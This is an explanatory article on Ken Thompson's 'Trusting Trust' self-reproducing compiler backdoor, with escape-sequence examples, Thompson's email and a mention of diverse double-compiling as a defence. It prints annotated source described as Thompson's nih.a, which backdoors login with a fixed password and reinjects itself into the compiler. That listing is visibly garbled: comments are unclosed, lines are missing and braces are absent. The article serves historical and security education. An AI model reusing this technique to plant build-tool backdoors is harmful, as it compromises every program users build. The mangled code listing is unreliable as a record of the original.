    &lt;p&gt;Thompson uses the example of how the C compiler handles character escape sequences to show how a compiler can teach itself new knowledge.&lt;/p&gt;
    &lt;p&gt;In C, you can write string literals with escape sequences:&lt;/p&gt;
    &lt;code&gt;"Hello world\n"
&lt;/code&gt;
    &lt;p&gt;The compiler needs to know what character code &lt;code&gt;\n&lt;/code&gt; represents. Here's the
clever part: the compiler can learn this in a completely portable way.&lt;/p&gt;
    &lt;code&gt;/* Figure 2.1 - Original escape sequence handling */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
}
&lt;/code&gt;
    &lt;p&gt;This code handles the backslash escape sequences. Notice how it uses &lt;code&gt;'\n'&lt;/code&gt; to
return the newline character—the compiler "knows" what &lt;code&gt;\n&lt;/code&gt; means because it's
baked-in to C itself.&lt;/p&gt;
    &lt;p&gt;Ok, now suppose we want to add support for &lt;code&gt;\v&lt;/code&gt; (vertical tab). We'd like to write:&lt;/p&gt;
    &lt;code&gt;/* Figure 2.2 - Desired code with \v support */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
    if (c == 'v')
        c = '\v';  // New: vertical tab
}
&lt;/code&gt;
    &lt;p&gt;But there's a problem: the current compiler doesn't understand &lt;code&gt;\v&lt;/code&gt; yet, so this
source code won't compile— we need to "train" the compiler first.&lt;/p&gt;
    &lt;p&gt;The solution is to temporarily use the actual character code (11 for vertical tab in ASCII):&lt;/p&gt;
    &lt;code&gt;/* Figure 2.3 - Training the compiler */
c = next();
if (c == '\\') {
    c = next();
    if (c == 'n')
        c = '\n';
    if (c == 'v')
        c = 11;  // Temporarily use the numeric code
}
&lt;/code&gt;
    &lt;p&gt;This version compiles successfully with the old compiler. Once we compile and install this new binary as the official C compiler, it now "knows" what &lt;code&gt;\v&lt;/code&gt;
means. We can then go back and rewrite the code using the portable &lt;code&gt;'\v'&lt;/code&gt; form
(Figure 2.2), and the new compiler will accept it.&lt;/p&gt;
    &lt;p&gt;As Thompson notes:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;This is a deep concept. It is as close to a "learning" program as I have seen. You simply tell it once, then you can use this self-referencing definition.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This self-referencing property is key to understanding how the Trojan horse works: once the compiler is "taught" something malicious, it can perpetuate that knowledge even after the evidence is removed from the source code.&lt;/p&gt;
    &lt;head rend="h3"&gt;Stage III: Slipping in the Trojan Horse&lt;/head&gt;
    &lt;p&gt;So now we have arrived to the actual Trojan horse logic. The idea of a Trojan horse predates Thompson's original work on C by at least a few years, with Thompson saying in the paper that he originally read about such an attack in "an Air Force critique of the security of an early implementation of Multics."4,5&lt;/p&gt;
    &lt;p&gt;Thompson's paper presents the concept in pseudocode:&lt;/p&gt;
    &lt;code&gt;/* Figure 3.2 - Simple Trojan horse concept */
compile(s)
char *s;
{
  // Trojan horse
  if (match(s, "pattern")) {
    compile("bug");
    return;
  }
  // ...
}
&lt;/code&gt;
    &lt;p&gt;But here's the actual implementation from Thompson's &lt;code&gt;nih.a&lt;/code&gt; file, with
annotations by Russ Cox (I highly recommend seeing his article for a more
detailed step-through of the code, as well as following along with his Unix
simulator):2&lt;/p&gt;
    &lt;code&gt;/* Declare the global variable nihflg, of implied type int. */
nihflg;

codenih()

    int i;

       compiler back end. To avoid discovery, do nothing when -p is used.
       The implied return type of codenih is int, but early C allowed
       omitting the return value. */
    if (pflag)
        return;

    /* Skip leading tabs in the line. */
    p = line;
    while (*p == '\t')
        p++;

        "while(*np!=':')np++;x1x:";

    /* With the p=+i from above, this is: strcpy(p+i, s); return;,
       appending the backdoor to the line.

    for (i = 0;; i++)
        if (!(*p++ = s[i]))
            break;
    goto l4;

    /* No match for login code. Next target:

            goto l2;

    nihflg++;
    goto l4;

    /* Next target: input reading loop in cc.c,
       but only if we've seen the av[4] line too:

    for (i = 0; i &amp;lt; 18; i++)
        if (s[i] != p[i])
            goto l3;

    /* Append input-reading backdoor: call codenih
       (this very code!) after reading each line.
       Increment nihflg to 2 to move to next state. */
    p =+ i;
    s = "codenih();";
    for (i = 0;; i++)
        if (!(*p++ = s[i]))
            break;
    nihflg++;
    goto l4;

    /* Next target: flushing output in cc.c. */

    for (i = 0; i &amp;lt; 13; i++)
        if (s[i] != p[i])
            goto l4;

    /* Insert end-of-file backdoor: call repronih

    nihflg++;
l4:;
}
&lt;/code&gt;
    &lt;p&gt;This code does three things:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Backdoors the login program: When compiling &lt;code&gt;login.c&lt;/code&gt;, it inserts code that accepts the password "codenih" for any user&lt;/item&gt;
      &lt;item&gt;Recognizes itself: When compiling the C compiler (&lt;code&gt;cc.c&lt;/code&gt;), it detects specific patterns that identify the compiler source&lt;/item&gt;
      &lt;item&gt;Self-reproduces: When compiling the compiler, it injects the code for both backdoors into the new compiler binary&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The final piece is the self-reproduction mechanism:&lt;/p&gt;
    &lt;code&gt;/* Here the magic begins, as presented in the Turing lecture.
   The %0 is not valid C. Instead, the script rc will replace the %
   with byte values for the text of this exact file,
   to be used by repronih. */
char nihstr[] {
%0
};

repronih()
{
    int i, n, c;

    /* If nihflg is not 3, this is not cc.c so don't do anything. */
    if (nihflg != 3)
        return;

    /* The most cryptic part of the whole program.
       Scan over nihstr (indexed by i) in five phases according to n:

       n=2: emit octal bytes of "%" and rest of file
       n=3: no output, looking for "%"
       n=4: emit literal text after "%" */

    for (i = n = 0; c = nihstr[i]; i++) {
        if (n == 0 &amp;amp;&amp;amp; c == '%') {
            printf("{\n");
            n++;
            continue;
        }
        if (n == 1 &amp;amp;&amp;amp; c == '%') {
            n++;
            i = 0;
        }
        if (n == 2) {
            printf("\t0%o,\n", c);
            continue;
        }
        if (n == 3 &amp;amp;&amp;amp; c == '%') {
            printf("};\n");
            n++;
            continue;
        }
        if (n &amp;gt; 0 &amp;amp;&amp;amp; n &amp;lt; 3)
            printf("\t0%o,\n", c);
        if (n == 0 || n &amp;gt;= 4)
            putchar(c);
    }
}
&lt;/code&gt;
    &lt;p&gt;No amount of reviewing source code would catch this, because the malicious logic never appears in the source once the system is "trained." The infection exists one layer below—inside the binary that generates other binaries. This is the essence of the Trusting Trust problem: if your compiler (or any build tool) is compromised, every program it builds is potentially compromised—even if their sources are pristine.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Training Process&lt;/head&gt;
    &lt;p&gt;To actually deploy this attack, Thompson had to "train" the compiler in stages:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;First compilation: Take a clean C compiler and add the&lt;/p&gt;&lt;code&gt;codenih()&lt;/code&gt;and&lt;code&gt;repronih()&lt;/code&gt;functions to its source. The&lt;code&gt;%0&lt;/code&gt;placeholder gets expanded by a helper script (&lt;code&gt;rc&lt;/code&gt;) into the actual byte values of the source code itself.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Install backdoored compiler: Compile this modified source with the clean compiler, creating a backdoored binary. Install this as the official C compiler.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Remove evidence: Now recompile the C compiler using the backdoored binary, but this time using the original clean source code (without the backdoor code). The backdoored compiler will recognize the compiler source and inject the backdoor code anyway, creating a new backdoored binary.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Perpetuation: From this point forward, the backdoor lives only in the binary. Every time the compiler compiles itself, it injects the backdoor. Every time it compiles&lt;/p&gt;&lt;code&gt;login.c&lt;/code&gt;, it inserts the password backdoor. The source code remains clean.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Closing&lt;/head&gt;
    &lt;p&gt;Was this actually ever distributed in the C compiler?&lt;/p&gt;
    &lt;p&gt;In an email from Thompson to an inquirer6, Thompson writes:&lt;/p&gt;
    &lt;quote&gt;From: Ken Thompson&lt;ken&gt;Date: Wed, Sep 28, 2011 at 6:27 PM Subject: Re: Was compiler from "Reflections" ever built or distributed? To: Ezra Lalonde&lt;/ken&gt;&lt;ezra&gt;build and not distributed. On Wed, Sep 28, 2011 at 11:35 AM, Ezra Lalonde&lt;/ezra&gt;&lt;ezra&gt;wrote: &amp;gt; Hi Ken, &amp;gt; &amp;gt; I've seen various sources on the internet claiming that the "trojan horse" &amp;gt; compiler you mentioned in your talk "Reflections on Trusting Trust" was &amp;gt; actually built, and some further claiming that it was distributed. &amp;gt; &amp;gt; I'd like to know if these claims are valid. &amp;gt; &amp;gt; Thanks for your time. &amp;gt; &amp;gt; Cheers, &amp;gt; Ezra Lalonde&lt;/ezra&gt;&lt;/quote&gt;
    &lt;p&gt;So, at least according to Thompson, this never made it out into the wild. However he also does leave this humorous line in the ACM paper:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The moral is obvious. You can't trust code that you did not totally create yourself. (Especially code from companies that employ people like me.)&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;For those interested, there has been followup research conducted after Thompson's paper that have shown how to prevent these types of attacks, like diverse double-compiling (DDC).7,8&lt;/p&gt;
